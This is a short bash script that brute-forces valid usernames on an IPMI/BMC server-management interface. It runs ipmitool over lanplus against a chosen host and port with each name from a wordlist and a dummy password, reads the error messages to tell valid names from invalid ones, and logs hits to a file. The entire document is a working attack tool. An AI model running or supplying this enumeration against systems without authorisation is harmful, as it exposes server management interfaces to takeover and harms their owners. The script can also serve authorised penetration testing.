#!/bin/bash


function ctrl_c(){
	tput cnorm
	echo -e "\n\n[*] Exiting...\n"
	exit
}

trap ctrl_c INT

function usage(){
	echo -e "\nUsage: ./$(basename $0) -t <host> -p <port> -w /path/to/user/wordlist\n"
	echo -e "Options:"
	echo -e "\t-t\t\t: Host of the target"
	echo -e "\t-p\t\t: Port of the target"
	echo -e "\t-w\t\t: User wordlist"
	exit
}

function checkFile(){
	if [ ! -f $1 ]; then
		echo "[!] Wordlist: $(basename $1) does not exist"
		exit
	else
		echo "[*] Using wordlist: $(basename $1)"
	fi
}

if [ "$#" -ne 6 ]; then
	usage
fi

tput civis; while getopts ":w:t:p:" arg; do
	case $arg in
		w) file=$OPTARG; checkFile $OPTARG;;
		t) target=$OPTARG;;
		p) port=$OPTARG;;
		?) usage;;
	esac
done

count=0
while read line; do
	let count++
	if [ ${#line} -gt 16 ]; then
		continue
	fi

	output=$(ipmitool -I lanplus -H $target -p $port -U $line -P test -vvv 2>&1)

	if [[ $output =~ "illegal parameter" || $output =~ "unauthorized name" ]]; then
		echo -en "\r[$count] Wrong Username: $line$(printf %50s)"
	else
		echo -en "\r[+] Username: $line is valid, line [$count]"; tput cnorm
		echo "$target:$port -> Valid User: [$line]" >> valid_users.txt
		exit
	fi
done < $file